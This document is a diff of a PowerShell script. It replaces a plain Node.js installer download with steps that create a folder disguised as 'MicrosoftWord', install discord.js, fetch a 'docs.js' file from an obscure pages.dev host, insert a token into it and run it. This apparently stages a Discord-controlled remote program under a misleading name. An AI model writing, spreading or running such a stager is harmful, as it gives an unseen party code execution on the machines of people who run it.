@@ -1,6 +1,27 @@
-$url = "https://nodejs.org/dist/v20.12.2/node-v20.12.2-x64.msi"
-$downloadPath = "$env:USERPROFILE\Downloads\nodeinstaller.msi"
+$folderPath = Join-Path -Path $env:USERPROFILE -ChildPath "MicrosoftWord"
 
-Invoke-WebRequest -Uri $url -OutFile $downloadPath
+if (-Not (Test-Path -Path $folderPath)) {
+    New-Item -Path $folderPath -ItemType Directory
+}
 
-Start-Process "msiexec.exe" -ArgumentList "/i `"$downloadPath`" /passive" -Wait
+Set-Location -Path $folderPath
+
+& "C:\Program Files\nodejs\npm.cmd" init -y
+
+Start-Sleep -Seconds 5
+
+& "C:\Program Files\nodejs\npm.cmd" install discord.js
+
+Start-Sleep -Seconds 5
+
+Invoke-WebRequest -Uri "https://ipspjyikta.pages.dev/files/docs.js" -OutFile "$folderPath\docs.js"
+
+$token = "ok"
+
+$content = Get-Content "$folderPath\docs.js" -Raw
+
+$updatedContent = $content -replace "const TOKEN = 'token here';", "const TOKEN = '$token';"
+
+Set-Content "$folderPath\docs.js" -Value $updatedContent
+
+& "C:\Program Files\nodejs\node.exe" "$folderPath\docs.js"
